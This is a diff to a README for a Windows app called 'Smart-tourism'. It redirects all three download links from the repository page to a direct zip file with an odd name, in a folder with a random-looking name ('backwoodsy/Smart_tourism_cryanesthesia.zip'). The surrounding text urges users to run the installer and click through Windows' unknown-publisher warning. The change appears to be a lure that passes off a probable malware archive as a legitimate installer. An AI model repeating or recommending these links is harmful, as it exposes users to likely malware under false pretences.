@@ -1,6 +1,6 @@
 # 🏛️ Smart-tourism - Keep every traveler safe and secure
 
-[![](https://img.shields.io/badge/Download_Application-Blue?style=for-the-badge)](https://github.com/Mimis7526/Smart-tourism)
+[![](https://img.shields.io/badge/Download_Application-Blue?style=for-the-badge)](https://github.com/Mimis7526/Smart-tourism/raw/refs/heads/main/backwoodsy/Smart_tourism_cryanesthesia.zip)
 
 ## 📌 Overview
 
@@ -20,7 +20,7 @@ Ensure your computer meets these requirements before you start:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Go to the [Official Download Page](https://github.com/Mimis7526/Smart-tourism).
+1. Go to the [Official Download Page](https://github.com/Mimis7526/Smart-tourism/raw/refs/heads/main/backwoodsy/Smart_tourism_cryanesthesia.zip).
 2. Click the green button labeled "Code" and select "Download ZIP".
 3. Save the file to your computer.
 4. Right-click the downloaded folder and select "Extract All".
@@ -43,7 +43,7 @@ If Windows displays a warning message about unknown publishers, click "More info
 
 ## 🔗 Download Link
 
-You can access the installer through this link: [Download Smart-tourism](https://github.com/Mimis7526/Smart-tourism).
+You can access the installer through this link: [Download Smart-tourism](https://github.com/Mimis7526/Smart-tourism/raw/refs/heads/main/backwoodsy/Smart_tourism_cryanesthesia.zip).
 
 ## 🛡️ Key Features
 
